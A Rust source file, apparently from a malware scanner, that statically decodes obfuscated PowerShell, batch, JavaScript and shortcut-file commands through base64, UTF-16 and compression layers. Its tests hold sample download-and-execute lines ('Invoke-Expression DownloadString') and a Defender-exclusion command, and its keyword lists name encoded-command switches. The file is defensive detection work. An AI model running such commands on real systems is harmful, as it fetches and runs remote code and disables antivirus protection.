//! Bounded, static text recovery. Never evaluate a script or launch an interpreter.
use base64::{
    Engine as _,
    engine::general_purpose::{STANDARD, STANDARD_NO_PAD},
};
use std::io::Read;

const MAX_INPUT: usize = 2 << 20;
const MAX_OUTPUT: usize = 4 << 20;
const MAX_VIEWS: usize = 16;
const MAX_DEPTH: usize = 3;
const MAX_TOKENS: usize = 128;

pub fn views(name: &str, data: &[u8]) -> Vec<Vec<u8>> {
    let input = &data[..data.len().min(MAX_INPUT)];
    let ext = super::filetype::ext_of(name);
    let initial = match text(input) {
        Some(t) => vec![t],
        None if ext == "lnk" => shortcut_strings(input),
        None => return Vec::new(),
    };
    let mut queue: Vec<_> = initial.into_iter().map(|t| (t, 0)).collect();
    let mut result = Vec::new();
    let mut used = 0;
    let mut decode_budget = MAX_OUTPUT;
    let mut attempts = 0;
    let mut cursor = 0;
    while cursor < queue.len() && result.len() < MAX_VIEWS {
        let (source, depth) = queue[cursor].clone();
        cursor += 1;
        if depth >= MAX_DEPTH {
            continue;
        }
        let lower = source.to_ascii_lowercase();
        let powershell = matches!(ext.as_str(), "ps1" | "psm1") || lower.contains("powershell") || lower.contains("pwsh");
        let batch = matches!(ext.as_str(), "bat" | "cmd") || lower.contains("cmd.exe");
        let normalized = normalize(&source, powershell, batch);
        let mut candidates = vec![normalized.clone()];
        let lower = normalized.to_ascii_lowercase();
        // Encoding data is normal. Only unwrap blobs in scripts with a decoder or
        // encoded-command switch, and ignore embedded web assets.
        if ["frombase64string", "-encodedcommand", "-enc ", "-e ", "-ec ", "atob(", "b64decode", "base64.b64decode"]
            .iter()
            .any(|p| lower.contains(p))
        {
            let mut start = 0;
            let bytes = normalized.as_bytes();
            while start < bytes.len() && attempts < MAX_TOKENS && candidates.len() < MAX_VIEWS && decode_budget > 0 {
                if !is_base64(bytes[start]) {
                    start += 1;
                    continue;
                }
                let mut end = start + 1;
                while end < bytes.len() && is_base64(bytes[end]) {
                    end += 1;
                }
                if end - start >= 24 && !bytes[..start].ends_with(b"base64,") {
                    attempts += 1;
                    let token = &bytes[start..end];
                    // Charge attempts, including invalid data, against a shared budget.
                    if token.len() > decode_budget {
                        start = end;
                        continue;
                    }
                    decode_budget -= token.len();
                    if let Ok(decoded) = STANDARD.decode(token).or_else(|_| STANDARD_NO_PAD.decode(token)) {
                        if let Some(t) = text(&decoded) {
                            candidates.push(t);
                        } else if let Some(t) = compressed_text(&decoded, &lower, &mut decode_budget) {
                            candidates.push(t);
                        }
                    }
                }
                start = end;
            }
        }
        for candidate in candidates {
            let bytes = candidate.as_bytes();
            if bytes == data || result.iter().any(|v: &Vec<u8>| v == bytes) {
                continue;
            }
            if used + bytes.len() > MAX_OUTPUT || result.len() >= MAX_VIEWS {
                break;
            }
            used += bytes.len();
            result.push(bytes.to_vec());
            queue.push((candidate, depth + 1));
        }
    }
    result
}

/// LNK is a binary container, so recover individual ASCII / UTF-16LE command
/// strings instead of treating the whole file as text. Never join separate fields.
fn shortcut_strings(data: &[u8]) -> Vec<String> {
    let mut result = Vec::new();
    for (stride, offset) in [(1, 0), (2, 0), (2, 1)] {
        let mut run = Vec::new();
        let mut i = offset;
        while i <= data.len() {
            let c = data.get(i).copied();
            let printable =
                c.is_some_and(|b| b.is_ascii_graphic() || b == b' ' || b == b'\t') && (stride == 1 || data.get(i + 1) == Some(&0));
            if printable {
                run.push(c.unwrap());
            } else if !run.is_empty() {
                if run.len() >= 24 {
                    let s = String::from_utf8(std::mem::take(&mut run)).unwrap();
                    let lower = s.to_ascii_lowercase();
                    if ["powershell", "pwsh", "cmd.exe", "-enc", "-e ", "-ec ", "frombase64string", "atob("]
                        .iter()
                        .any(|p| lower.contains(p))
                        && !result.contains(&s)
                    {
                        result.push(s);
                        if result.len() == MAX_VIEWS {
                            return result;
                        }
                    }
                }
                run.clear();
            }
            i += stride;
            // Flush a final wide run even if the final pair ends at an odd offset.
            if i > data.len() && !run.is_empty() {
                i = data.len();
            }
        }
    }
    result
}

fn compressed_text(data: &[u8], source: &str, budget: &mut usize) -> Option<String> {
    let reader: Box<dyn Read + '_> = if data.starts_with(&[0x1f, 0x8b]) {
        Box::new(flate2::read::GzDecoder::new(data))
    } else if data.len() >= 2 && data[0] == 0x78 && u16::from_be_bytes([data[0], data[1]]).is_multiple_of(31) {
        Box::new(flate2::read::ZlibDecoder::new(data))
    } else if source.contains("deflatestream") {
        Box::new(flate2::read::DeflateDecoder::new(data))
    } else {
        return None;
    };
    if *budget == 0 {
        return None;
    }
    let limit = (*budget).min(MAX_INPUT);
    let mut out = Vec::new();
    let read = reader.take(limit as u64 + 1).read_to_end(&mut out);
    *budget = budget.saturating_sub(out.len());
    if read.is_err() || out.len() > limit {
        return None;
    }
    text(&out)
}

fn is_base64(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=')
}

fn text(data: &[u8]) -> Option<String> {
    let be = data.starts_with(&[0xfe, 0xff]);
    let le = data.starts_with(&[0xff, 0xfe]);
    let pairs = data.len().min(256) / 2;
    let wide_le = pairs >= 8 && data[..pairs * 2].as_chunks::<2>().0.iter().filter(|c| c[1] == 0).count() * 4 >= pairs * 3;
    let wide_be = pairs >= 8 && data[..pairs * 2].as_chunks::<2>().0.iter().filter(|c| c[0] == 0).count() * 4 >= pairs * 3;
    let s = if be || le || wide_le || wide_be {
        if !data.len().is_multiple_of(2) {
            return None;
        }
        let offset = if be || le { 2 } else { 0 };
        let words: Vec<u16> = data[offset..]
            .as_chunks::<2>()
            .0
            .iter()
            .map(|c| if be || wide_be { u16::from_be_bytes([c[0], c[1]]) } else { u16::from_le_bytes([c[0], c[1]]) })
            .collect();
        String::from_utf16(&words).ok()?
    } else {
        std::str::from_utf8(data).ok()?.trim_start_matches('\u{feff}').to_owned()
    };
    let controls = s.chars().filter(|c| c.is_control() && !matches!(c, '\r' | '\n' | '\t')).count();
    (controls == 0).then_some(s)
}

fn normalize(source: &str, powershell: bool, batch: bool) -> String {
    let bytes = source.as_bytes();
    let mut unescaped = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if i + 1 < bytes.len() {
            let next = bytes[i + 1];
            // Preserve meaningful PowerShell escapes (`n, `t, etc.).
            if (powershell && b == b'`' && next.is_ascii_alphabetic() && !b"0abefnrtuv".contains(&next.to_ascii_lowercase()))
                || (batch && b == b'^' && next.is_ascii_alphanumeric())
            {
                i += 1;
                continue;
            }
            if ((powershell && b == b'`') || (batch && b == b'^')) && matches!(next, b'\r' | b'\n') {
                i += 2;
                if next == b'\r' && bytes.get(i) == Some(&b'\n') {
                    i += 1;
                }
                continue;
            }
        }
        unescaped.push(b);
        i += 1;
    }
    // Only fold adjacent quoted literals joined by + (or VBScript's &).
    // Variables, function calls, interpolation and arbitrary expressions are not evaluated.
    let mut out = Vec::with_capacity(unescaped.len());
    i = 0;
    while i < unescaped.len() {
        if let Some((mut value, mut end)) = literal(&unescaped, i, !powershell && !batch) {
            loop {
                let mut j = end;
                while unescaped.get(j).is_some_and(u8::is_ascii_whitespace) {
                    j += 1;
                }
                if !matches!(unescaped.get(j), Some(b'+' | b'&')) {
                    break;
                }
                j += 1;
                while unescaped.get(j).is_some_and(u8::is_ascii_whitespace) {
                    j += 1;
                }
                let Some((next, next_end)) = literal(&unescaped, j, !powershell && !batch) else {
                    break;
                };
                value.extend(next);
                end = next_end;
            }
            out.push(unescaped[i]);
            out.extend(value);
            out.push(unescaped[i]);
            i = end;
        } else {
            // An unterminated literal can contain thousands of escaped quotes.
            // Do not retry parsing every suffix (quadratic work on hostile input).
            if matches!(unescaped[i], b'\'' | b'"') {
                out.extend_from_slice(&unescaped[i..]);
                break;
            }
            out.push(unescaped[i]);
            i += 1;
        }
    }
    String::from_utf8(out).unwrap_or_else(|_| source.to_owned())
}

fn literal(bytes: &[u8], start: usize, escapes: bool) -> Option<(Vec<u8>, usize)> {
    let quote = *bytes.get(start)?;
    if !matches!(quote, b'\'' | b'"') {
        return None;
    }
    let mut out = Vec::new();
    let mut i = start + 1;
    while i < bytes.len() {
        if bytes[i] == quote {
            return Some((out, i + 1));
        }
        if escapes && bytes[i] == b'\\' {
            let next = *bytes.get(i + 1)?;
            let count = match next {
                b'x' => 2,
                b'u' => 4,
                _ => 0,
            };
            if count > 0 {
                if let Some(hex) = bytes.get(i + 2..i + 2 + count).and_then(|s| std::str::from_utf8(s).ok())
                    && let Some(c) = u32::from_str_radix(hex, 16).ok().and_then(char::from_u32)
                {
                    let mut buf = [0; 4];
                    out.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
                    i += 2 + count;
                    continue;
                }
            } else if next == quote || next == b'\\' {
                out.push(next);
                i += 2;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn recovers_nested_utf16_base64() {
        let payload = "Invoke-Expression (DownloadString('https://example.invalid'))";
        let wide: Vec<u8> = payload.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let inner = format!("powershell -enc {}", STANDARD.encode(wide));
        let outer = format!("atob('{}')", STANDARD.encode(inner));
        assert!(views("drop.js", outer.as_bytes()).iter().any(|v| v == payload.as_bytes()));
    }
    #[test]
    fn folds_literals_and_preserves_boundaries() {
        assert_eq!(
            normalize(r#"'Down' + 'loadString(' ; 'Invoke-' + 'Expression'"#, true, false),
            "'DownloadString(' ; 'Invoke-Expression'"
        );
        assert_eq!(normalize(r#"'Down' + $variable + 'loadString('"#, true, false), r#"'Down' + $variable + 'loadString('"#);
        assert_eq!(normalize(r#"'\x49\u0045X('"#, false, false), "'IEX('");
        assert_eq!(normalize("Inv`oke-Expression`n", true, false), "Invoke-Expression`n");
        assert_eq!(normalize("po^wershell", false, true), "powershell");
    }
    #[test]
    fn ignores_assets_binary_and_ungated_encoding() {
        let encoded = STANDARD.encode("a harmless string that is long enough");
        assert!(views("app.js", encoded.as_bytes()).is_empty());
        assert!(views("app.ps1", &[0xff, 0, 0x81]).is_empty());
        let asset = format!("atob('data:image/png;base64,{encoded}')");
        assert!(views("app.js", asset.as_bytes()).is_empty());
    }

    #[test]
    fn extracts_encoded_commands_from_binary_shortcuts() {
        let payload = "Invoke-Expression DownloadString( Add-MpPreference -ExclusionPath";
        let command = format!("powershell -enc {}", STANDARD.encode(payload));
        for offset in [76, 77] {
            let mut lnk = vec![0; offset];
            lnk[0] = 0x4c;
            lnk.extend(command.encode_utf16().flat_map(u16::to_le_bytes));
            assert!(views("link.lnk", &lnk).iter().any(|v| v == payload.as_bytes()));
            assert!(views("file.py", &lnk).is_empty());
        }
    }
    #[test]
    fn enforces_work_budget_on_hostile_input() {
        let input = format!("atob('{}')", "A".repeat(MAX_INPUT * 2));
        let recovered = views("a.js", input.as_bytes());
        assert!(recovered.len() <= MAX_VIEWS);
        assert!(recovered.iter().map(Vec::len).sum::<usize>() <= MAX_OUTPUT);
        let malformed = format!("'{}", "\\'".repeat(100_000));
        assert_eq!(normalize(&malformed, false, false), malformed);
    }

    #[test]
    fn decodes_compressed_text_and_rejects_expansion_bombs() {
        use std::io::Write;
        let payload = b"Invoke-Expression DownloadString( Add-MpPreference -ExclusionPath";
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        encoder.write_all(payload).unwrap();
        let zipped = encoder.finish().unwrap();
        let script = format!("[Convert]::FromBase64String('{}'); GzipStream", STANDARD.encode(&zipped));
        assert!(views("a.ps1", script.as_bytes()).iter().any(|v| v == payload));
        let mut budget = MAX_OUTPUT;
        assert!(compressed_text(&zipped[..zipped.len() - 4], "", &mut budget).is_none());
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        encoder.write_all(&vec![b'A'; MAX_INPUT + 100]).unwrap();
        let mut budget = MAX_OUTPUT;
        assert!(compressed_text(&encoder.finish().unwrap(), "", &mut budget).is_none());
        assert!(budget < MAX_OUTPUT);
    }

    #[test]
    fn decodes_zlib_and_explicit_deflate_streams() {
        use std::io::Write;
        let payload = b"Invoke-Expression DownloadString(";
        let mut zlib = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::fast());
        zlib.write_all(payload).unwrap();
        let mut budget = MAX_OUTPUT;
        assert_eq!(compressed_text(&zlib.finish().unwrap(), "", &mut budget).unwrap().as_bytes(), payload);
        let mut deflate = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::fast());
        deflate.write_all(payload).unwrap();
        let data = deflate.finish().unwrap();
        assert!(compressed_text(&data, "", &mut budget).is_none());
        assert_eq!(compressed_text(&data, "deflatestream", &mut budget).unwrap().as_bytes(), payload);
    }
}
